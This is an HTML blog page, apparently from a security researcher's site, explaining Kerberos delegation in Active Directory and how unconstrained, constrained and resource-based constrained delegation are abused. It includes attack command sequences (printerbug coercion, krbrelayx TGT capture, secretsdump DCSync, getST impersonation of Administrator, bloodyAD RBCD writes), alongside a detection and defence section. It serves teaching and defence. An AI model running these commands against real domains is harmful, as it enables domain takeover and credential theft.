@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kerberos Delegation — Satej Chaudhari</title>
+  <meta name="description" content="Unconstrained, constrained, and resource-based constrained delegation — how the impersonation feature works and how each variant is abused for privilege escalation.">
+
+  <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="wrap-wide">
+      <a class="brand" href="../index.html">
+        <span class="brand-mark">SC</span>
+        <span class="brand-name">Satej Chaudhari</span>
+      </a>
+
+      <nav class="site-nav">
+        <a href="../index.html">Home</a>
+        <a href="../writeups.html">Writeups</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="https://github.com/satejchaudhari" target="_blank" rel="noopener" class="nav-external">GitHub</a>
+      </nav>
+
+      <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="3" y1="6" x2="21" y2="6"></line>
+          <line x1="3" y1="12" x2="21" y2="12"></line>
+          <line x1="3" y1="18" x2="21" y2="18"></line>
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <main class="wrap post">
+    <a class="post-back" href="../theory.html">&larr; back to theory</a>
+
+    <article>
+      <header class="post-header">
+        <span class="tag">AD</span>
+
+        <h1 class="post-title">Kerberos Delegation</h1>
+
+        <p class="post-meta">
+          <time datetime="2026-08-18">2026-08-18</time>
+          <span>&middot; 11 min read</span>
+        </p>
+      </header>
+
+      <div class="post-body">
+        <p>
+          Delegation is a legitimate Kerberos feature that lets a service act on a user's
+          behalf when talking to a second service — the mechanism that makes "single sign-on
+          all the way through" work. A web app that needs to reach a database <em>as the
+          logged-in user</em> uses delegation to do it. That same impersonation power, when
+          misconfigured, becomes one of the richest privilege-escalation surfaces in Active
+          Directory. There are three flavours, and each is abused differently.
+        </p>
+
+        <h2>Why delegation exists</h2>
+
+        <p>
+          Imagine a user authenticates to a front-end web server, and that server needs to
+          fetch the user's records from a back-end database — enforcing the user's own
+          permissions, not the web server's. The web server needs to present the
+          <em>user's</em> identity to the database. Delegation is the controlled way to let
+          the front-end request a ticket to the back-end on the user's behalf.
+        </p>
+
+        <p>
+          The security question is always the same: <em>how tightly is that impersonation
+          scoped?</em> The three delegation types are three answers, from dangerously broad
+          to relatively narrow.
+        </p>
+
+        <h2>Unconstrained delegation</h2>
+
+        <p>
+          The original, and the most dangerous. A host trusted for
+          <strong>unconstrained delegation</strong> is allowed to impersonate a user to
+          <em>any</em> service. The mechanism: when a user authenticates to such a host,
+          their <strong>TGT</strong> is sent along and cached in the host's memory. With the
+          user's TGT in hand, the host can request tickets to anything as that user.
+        </p>
+
+        <p>
+          The abuse follows immediately. If you compromise a host trusted for unconstrained
+          delegation, you get every TGT cached on it. And you do not have to wait for a
+          valuable user to log in — you <a href="2026-08-18-coercion-ntlm-relay.html">coerce</a>
+          one, ideally a <strong>domain controller</strong>, into authenticating to your
+          host. The DC's TGT lands in your cache, and a DC's TGT is effectively the domain.
+        </p>
+
+        <pre><code># find unconstrained-delegation hosts
+(userAccountControl:1.2.840.113556.1.4.803:=524288)
+
+# on the delegation host you control, capture inbound TGTs
+krbrelayx.py -aesKey &lt;host_aes_key&gt;
+# coerce the DC to authenticate to it
+printerbug.py corp.local/user:pass@dc01 attacker_host
+# reuse the captured DC TGT to DCSync
+export KRB5CCNAME=DC01\$@CORP.LOCAL.ccache
+secretsdump.py -k -no-pass dc01.corp.local</code></pre>
+
+        <blockquote>
+          The flag <code>TRUSTED_FOR_DELEGATION</code> on any computer you can compromise is
+          close to game over. Domain controllers have it by design; the danger is when an
+          ordinary server has it too, because that server becomes a stepping stone to the
+          DC's identity.
+        </blockquote>
+
+        <h2>Constrained delegation</h2>
+
+        <p>
+          Microsoft's response to how dangerous unconstrained delegation is.
+          <strong>Constrained delegation</strong> limits a service to impersonating users
+          only to a <em>specific list</em> of target services, named in the account's
+          <code>msDS-AllowedToDelegateTo</code> attribute. It also introduces
+          <strong>protocol transition</strong> (S4U2Self), which lets the service obtain a
+          ticket to itself as any user, even one who never actually authenticated.
+        </p>
+
+        <p>
+          The abuse turns on two extensions:
+        </p>
+
+        <table>
+          <thead>
+            <tr><th>Extension</th><th>What it does</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>S4U2Self</td><td>Lets the service request a ticket <em>to itself</em> as any chosen user — including Administrator</td></tr>
+            <tr><td>S4U2Proxy</td><td>Lets the service use that ticket to request a ticket to a delegated target service, as that user</td></tr>
+          </tbody>
+        </table>
+
+        <p>
+          So if you compromise an account configured for constrained delegation, you can
+          impersonate <em>any</em> user (via S4U2Self) to the allowed target services (via
+          S4U2Proxy). If a delegated target is something like <code>cifs/dc01</code>, you can
+          reach that service as Administrator.
+        </p>
+
+        <pre><code># impersonate Administrator to an allowed service
+getST.py -spn cifs/dc01.corp.local -impersonate Administrator \
+  corp.local/svc_web:Passw0rd</code></pre>
+
+        <blockquote>
+          A subtlety worth knowing: the target service name in S4U2Proxy is not strongly
+          bound to a single service class, so obtaining a ticket for one SPN on a host often
+          lets you talk to other services on that same host. Constrained is safer than
+          unconstrained, but "constrained to a domain controller service" is still a full
+          compromise path.
+        </blockquote>
+
+        <h2>Resource-based constrained delegation (RBCD)</h2>
+
+        <p>
+          The modern variant, and the one that appears constantly in attack chains because it
+          can be <em>set up</em> by the attacker. With classic constrained delegation, the
+          config lives on the impersonating account and requires privilege to change. RBCD
+          flips the direction: the <em>resource</em> (the target) decides who is allowed to
+          delegate to it, via its <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>
+          attribute.
+        </p>
+
+        <p>
+          That means if you have write access to a computer object, you can point its RBCD
+          attribute at an account <em>you</em> control, and then impersonate any user to that
+          computer. Write access to a computer object is common — via an
+          <a href="2026-08-18-acls-dacls.html">ACL</a>, or via a
+          <a href="2026-08-18-coercion-ntlm-relay.html">relayed LDAP session</a>.
+        </p>
+
+        <table>
+          <thead>
+            <tr><th>Step</th><th>Action</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>1. Control an account with an SPN</td><td>Create a computer account (any user can, by default, create up to 10) or use one you own</td></tr>
+            <tr><td>2. Write the RBCD attribute</td><td>Set <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on the target to your account</td></tr>
+            <tr><td>3. Impersonate</td><td>Use S4U2Self + S4U2Proxy to get a ticket to the target as Administrator</td></tr>
+          </tbody>
+        </table>
+
+        <pre><code># create a computer account you control
+addcomputer.py -computer-name EVIL\$ -computer-pass Passw0rd corp.local/jdoe:pass
+
+# write RBCD on the target to trust EVIL$
+bloodyAD -u jdoe -p pass -d corp.local add rbcd TARGET\$ EVIL\$
+
+# impersonate Administrator to the target
+getST.py -spn cifs/target.corp.local -impersonate Administrator \
+  corp.local/EVIL\$:Passw0rd</code></pre>
+
+        <h2>Comparison</h2>
+
+        <table>
+          <thead>
+            <tr><th>Type</th><th>Scope of impersonation</th><th>Attacker angle</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Unconstrained</td><td>Any service, any user who authenticates to the host</td><td>Compromise the host, coerce a DC, capture its TGT</td></tr>
+            <tr><td>Constrained</td><td>Specific target services, but any user</td><td>Compromise the delegating account, impersonate Administrator to the targets</td></tr>
+            <tr><td>RBCD</td><td>Decided by the target resource</td><td>Gain write on the target, point it at an account you control</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Detection and defence</h2>
+
+        <ul>
+          <li><strong>Eliminate unconstrained delegation</strong> wherever it is not strictly required, and never on anything but DCs. Mark sensitive accounts "not delegatable" (the <code>NOT_DELEGATED</code> flag / Protected Users group).</li>
+          <li><strong>Audit delegation attributes</strong> — <code>msDS-AllowedToDelegateTo</code> and <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> — regularly; unexpected values are findings.</li>
+          <li><strong>Restrict who can create computer accounts.</strong> The default <code>MachineAccountQuota</code> of 10 is what makes the RBCD chain trivial; set it to 0.</li>
+          <li><strong>Put Tier-0 accounts in Protected Users</strong> so they cannot be delegated at all.</li>
+          <li><strong>Enforce LDAP signing/channel binding</strong> to close the relay route into RBCD setup.</li>
+        </ul>
+
+        <h2>The takeaway</h2>
+
+        <p>
+          Delegation is impersonation with a scope dial. Unconstrained sets the dial to
+          "everything" and turns any compromised delegation host into a route to the DC's own
+          identity. Constrained narrows the targets but still lets you impersonate anyone to
+          them. RBCD moves the control onto the resource, which is exactly why attackers love
+          it — write access to a computer object is enough to grant yourself impersonation.
+          BloodHound surfaces all three, and the abuse tools (getST, bloodyAD, krbrelayx,
+          ntlmrelayx) are in the <a href="../toolkit.html">Toolkit</a>. The ticket mechanics
+          behind S4U are on the <a href="2026-08-18-kerberos.html">Kerberos</a> page.
+        </p>
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap-wide">
+      <p>&copy; 2026 Satej Chaudhari</p>
+      <div class="footer-links">
+        <a href="../writeups.html">Writeups</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
